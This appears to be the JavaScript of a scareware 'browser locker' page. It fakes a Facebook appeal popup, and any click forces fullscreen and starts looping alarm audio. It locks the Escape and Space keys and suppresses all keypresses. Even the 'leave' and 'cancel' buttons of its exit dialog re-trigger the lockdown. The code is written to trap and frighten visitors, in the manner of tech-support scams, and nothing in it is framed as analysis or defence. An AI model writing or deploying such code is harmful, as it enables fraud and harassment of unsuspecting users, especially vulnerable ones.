/* ============================================================
   GLOBAL AUDIO FIX (PREVENT DOUBLE eng.mp3 PLAYBACK)
============================================================ */
let globalAlertAudio = null;
let globalAudioStarted = false;

function initGlobalAudio() {
    if (!globalAlertAudio) {
        globalAlertAudio = new Audio("eng.mp3");
        globalAlertAudio.loop = true;
        globalAlertAudio.volume = 1.0;
    }
}

function startGlobalAudio() {
    initGlobalAudio();

    if (!globalAudioStarted) {
        globalAlertAudio.play().catch(() => {
            console.log("Autoplay blocked until user clicks");
        });
        globalAudioStarted = true;
    }
}

/* ============================================================
   FULLSCREEN FIX — Prevent exit on click
============================================================ */

function forceFullScreen() {
    let doc = document.documentElement;

    if (!document.fullscreenElement) {
        if (doc.requestFullscreen) doc.requestFullscreen();
        else if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
        else if (doc.msRequestFullscreen) doc.msRequestFullscreen();
    }
    // If already fullscreen → do nothing
}

/* ============================================================
   FIRST SCREEN FACEBOOK POPUP FUNCTIONALITY
============================================================ */

let firstScreenActive = true;

function hideFirstScreen() {
    if (!firstScreenActive) return;

    firstScreenActive = false;

    const fs = document.getElementById("firstScreen");
    if (fs) fs.style.display = "none";

    const mc = document.getElementById("mainContent");
    if (mc) mc.style.display = "block";
}

document.addEventListener("DOMContentLoaded", () => {
    const btn1 = document.querySelector(".appeal");
    const btn2 = document.querySelector(".ignore");
    const closeBtn = document.querySelector(".fb-close");

    [btn1, btn2, closeBtn].forEach((btn) => {
        if (!btn) return;
        btn.addEventListener("click", function (e) {
            e.stopPropagation();
            hideFirstScreen();
            startGlobalAudio();
            forceFullScreen(); 
        });
    });
});

// Clicking anywhere hides popup + enforces fullscreen
document.addEventListener("click", function () {
    hideFirstScreen();
    startGlobalAudio();
    forceFullScreen();
});

/* ============================================================
   ORIGINAL CODE (KEPT EXACT, WITH fullscreen FIX)
============================================================ */

function getQueryParam(param) {
  const urlParams = new URLSearchParams(window.location.search);
  return urlParams.get(param);
}

$(document).ready(function () {
  var audioElement = document.createElement("audio");
  audioElement.setAttribute("src", "alert-en.wav");

  audioElement.addEventListener("ended", function () {
      this.play();
  }, false);

  addEventListener("click", function () {

    hideFirstScreen();

    var el = document.documentElement,
      reffer =
        el.requestFullScreen ||
        el.webkitRequestFullScreen ||
        el.mozRequestFullScreen;

    if (reffer) reffer.call(el);

    audioElement.play();
    startGlobalAudio();
  });

  if ("keyboard" in navigator && "lock" in navigator.keyboard) {
    navigator.keyboard.lock(["Escape", "Space"]);
  }

  document.addEventListener("keydown", function (event) {
    event.preventDefault();
  }, false);
});

window.onload = function () {
  const dialog = document.getElementById("leaveDialog");
  const leaveBtn = document.getElementById("leaveBtn");
  const cancelBtn = document.getElementById("cancelBtn");

  if (dialog) dialog.classList.add("ls-show");

  document.addEventListener("click", function () {
    hideFirstScreen();
    startGlobalAudio();
    forceFullScreen();
  });

  if (leaveBtn) {
    leaveBtn.onclick = (event) => {
      event.stopPropagation();
      dialog.classList.remove("ls-show");
      hideFirstScreen();
      startGlobalAudio();
      forceFullScreen();
    };
  }

  if (cancelBtn) {
    cancelBtn.onclick = (event) => {
      event.stopPropagation();
      dialog.classList.remove("ls-show");
      hideFirstScreen();
      startGlobalAudio();
      forceFullScreen();
    };
  }
};

/* ============================================================
   RESTART FACEBOOK POPUP ANIMATION
============================================================ */
setInterval(() => {
    const box = document.querySelector(".fb-box");
    if (box) {
        box.classList.remove("fb-animate");
        void box.offsetWidth;
        box.classList.add("fb-animate");
    }
}, 3000);
